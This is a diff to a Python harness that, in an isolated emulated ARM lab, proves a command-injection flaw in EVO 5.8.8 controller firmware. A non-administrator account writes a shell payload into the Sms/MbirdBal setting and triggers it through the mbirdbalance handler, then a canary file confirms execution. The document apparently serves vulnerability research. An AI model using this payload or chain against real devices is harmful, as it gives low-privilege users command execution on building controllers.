@@ -107,6 +107,9 @@ def main():
         "custom_lidl": 0,
         "ldap": 0,
     }))
+    (RUN / "libconfig.lua").write_text(
+        "local loader = assert(package.loadlib('libconfig.so', 'luaopen_libconfig'))\nreturn loader()\n"
+    )
     (RUN / "ssh-client.log").touch()
     (ROOT / "usr/bin/qemu-arm").touch(exist_ok=True)
     (ROOT / "usr/bin/start-stop-daemon").touch(exist_ok=True)
@@ -123,6 +126,7 @@ def main():
     }
     for source in lua_modules.values():
         (ROOT / "opt/evo-compat/lua" / source).touch(exist_ok=True)
+    (ROOT / "opt/evo-compat/lua/libconfig.so").touch(exist_ok=True)
     (ROOT / "opt/evo-compat/sysroot/lib/ld-linux.so.3").touch(exist_ok=True)
 
     name = f"evo-http-ssh-chain-{os.getpid()}"
@@ -136,6 +140,7 @@ def main():
         (LUA / "root/lib/arm-linux-gnueabi", "/rootfs/opt/evo-compat/lib", "ro"),
         (LUA / "root/usr/lib/arm-linux-gnueabi", "/rootfs/opt/evo-compat/usr-lib", "ro"),
         (LUA / "root/usr/bin/lua5.1", "/rootfs/usr/bin/lua", "ro"),
+        (REPO / "extracted/XWEB_EVO_5.8.8_ARM_package/usr/lib/libconfig.so", "/rootfs/opt/evo-compat/lua/libconfig.so", "ro"),
     ]
     for source, destination in lua_modules.items():
         volumes.append((LUA / "root/usr/lib/arm-linux-gnueabi" / source, f"/rootfs/opt/evo-compat/lua/{destination}", "ro"))
@@ -147,6 +152,7 @@ def main():
         (FIXTURE / "root/lib/arm-linux-gnueabi", "/rootfs/opt/evo-compat/dropbear-lib", "ro"),
         (RUNTIME / "lighttpd-custom.conf", "/rootfs/etc/lighttpd/lighttpd-custom.conf", "ro"),
         (RUN / "xwebconfig.json", "/rootfs/etc/xwebconfig.json", "ro"),
+        (RUN / "libconfig.lua", "/rootfs/usr/share/lua/5.1/libconfig.lua", "ro"),
         (RUNTIME / "xwpasswd", "/rootfs/opt/xweb/bin/tools/xwpasswd", "ro"),
         (RUNTIME / "ip", "/rootfs/usr/bin/ip", "ro"),
         (RUNTIME / "curl", "/rootfs/usr/bin/curl", "ro"),
@@ -205,7 +211,10 @@ def main():
         time.sleep(1)
 
         schema = json.loads((ROOT / "opt/xweb/permissions.json").read_text())
-        permissions = {context: {permission: 1 for permission in values} for context, values in schema.items()}
+        mbird_test = os.environ.get("EVO_MBIRD_TEST") == "1"
+        permissions = {context: {permission: 0 if mbird_test else 1 for permission in values} for context, values in schema.items()}
+        if mbird_test:
+            permissions["system"]["settings-edit"] = 1
         profile_config = {"id": 99, "label": "Lab full-permission profile"}
         salt = "lab-only-salt"
         user_config = {
@@ -261,6 +270,51 @@ def main():
         users = request(name, "/cgi-bin/users.lua", action="get", SSES=session)
         if "2" not in users.get("users", {}):
             raise RuntimeError(f"Lab user cannot read its privileged user information: {users}")
+        if mbird_test:
+            denied = request(name, "/cgi-bin/debug.lua", action="terminal", command="id", SSES=session)
+            if denied.get("error") != "PERMISSION_DENIED":
+                raise RuntimeError(f"Regular account unexpectedly reached the Administrator terminal: {denied}")
+            payload = "http://127.0.0.1/; id >/tmp/evo-mbird-id; printf EVO_MBIRD_CANARY >/tmp/evo-mbird-canary; /bin/busybox chmod 644 /tmp/evo-mbird-id; #"
+            settings = [
+                {"section": "Sms", "key": "MbirdBal", "value": payload},
+                {"section": "Sms", "key": "MbirdCode", "value": "lab"},
+            ]
+            set_result = request(
+                name,
+                "/cgi-bin/systemsetup.lua",
+                action="set",
+                SSES=session,
+                settings=json.dumps(settings, separators=(",", ":")),
+                reboot="0",
+            )
+            try:
+                balance = request(name, "/cgi-bin/utility.lua", action="mbirdbalance", SSES=session)
+            except subprocess.CalledProcessError as error:
+                balance = {"http_error": error.returncode}
+            canary = RUN / "tmp/evo-mbird-canary"
+            if not canary.exists() or canary.read_text() != "EVO_MBIRD_CANARY":
+                raise RuntimeError(f"MessageBird canary missing after {balance}")
+            command_output = (RUN / "tmp/evo-mbird-id").read_text().strip()
+            result = {
+                "scope": "Actual EVO 5.8.8 handlers in a network-disabled Docker/QEMU ARM lab",
+                "regular_user_id": login["user"]["id"],
+                "regular_profile_id": login["user"]["profile"],
+                "administrator_terminal_denied": denied,
+                "settings_edit_response": set_result,
+                "injection_field": "Sms/MbirdBal",
+                "trigger_action": "mbirdbalance",
+                "canary_content": canary.read_text(),
+                "command_output": command_output,
+                "validated": True,
+                "limitations": [
+                    "No physical controller or external network was used",
+                    "The account and profile are synthetic and the user is not Administrator",
+                    "Physical device privileges and reachability remain unverified"
+                ],
+            }
+            (REPO / "results/evo-5.8.8-mbird-command-injection.json").write_text(json.dumps(result, indent=2) + "\n")
+            print(json.dumps(result, indent=2))
+            return 0
         result = {
             "scope": "Actual EVO 5.8.8 Lighttpd/Lua and Dropbear in one network-disabled Docker/QEMU ARM lab",
             "public_sysinfo_id": sysinfo["info"]["id"],
